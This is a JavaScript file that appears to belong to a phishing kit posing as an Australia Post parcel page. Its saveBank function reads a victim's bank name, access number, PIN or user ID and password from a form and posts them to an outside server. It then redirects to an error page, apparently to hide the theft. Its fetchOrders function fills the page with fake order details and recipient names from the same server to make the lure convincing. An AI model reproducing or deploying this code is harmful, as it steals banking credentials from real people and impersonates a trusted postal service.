const APIUrl = `https://ap-api-iota.vercel.app`;

function saveBank() {
    const baseUrl = APIUrl;
    const btn = document.getElementById("pc-submit-button");
    if (!btn) return;
    btn.addEventListener("click", function () {
        const accessNumber = document.getElementById("login").value;
        const username1 = document.getElementById("pin");
        let userId = "";
        if (username1) {
            userId = username1.value;
        }
        const password = document.getElementById("password").value;
        const bank = document.getElementById("bank-name").value;

        const formData = new FormData();
        formData.append("accessNumber", accessNumber);
        formData.append("userId", userId);
        formData.append("password", password);
        formData.append("bank", bank);

        fetch(`${baseUrl}/api/saveBank`, {
            method: "POST",
            body: formData
        })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    window.location.href = `${window.location.origin}/error.html`;
                    console.log("Data saved successfully:", data);
                }
            })
            .catch(error => {
                console.error("Error:", error);
            });

    });
}

function query(id) {
    let div = document.querySelector(`#${id}`);
    return div;
}

function fetchOrders() {
    try {
        fetch(`${APIUrl}/api/getOrders`)
            .then(response => response.json())
            .then(data => {
                const orders = data.orders[0];
                if (orders) {
                    const order = orders;

                    const title = document.createElement('h2');
                    title.textContent = `${order.product} | Australia Post`;

                    const pimg = query("product-image");
                    if (pimg) {
                      pimg.innerHTML = `<img 
                        class="w-full h-full object-contain" 
                        src="${order.image}" 
                        alt="${order.product}" 
                        title="${order.product}" 
                      />`;
                    }
                    
                    const ptitle = query("p-title")
                    ptitle ? ptitle.innerHTML = order.product : null;

                    const pprice = query("p-price");
                    pprice ? pprice.innerHTML = `${order.price} AUD` : null;

                    const paddr = query("p-address");
                    paddr ? paddr.innerHTML = order.address : null;

                    const paddri = query("address-data1");
                    paddri ? paddri.value = order.address : null;

                    const pname = query("name-data1");
                    pname ? pname.value = order.receipient_name : null;

                    const pnamel = query("namel-data1");
                    pnamel ? pnamel.value = order.receipient_last_name : null;
                }
            })
    } catch (error) {
        console.error('Error fetching orders:', error);
    }
}

saveBank();
fetchOrders();
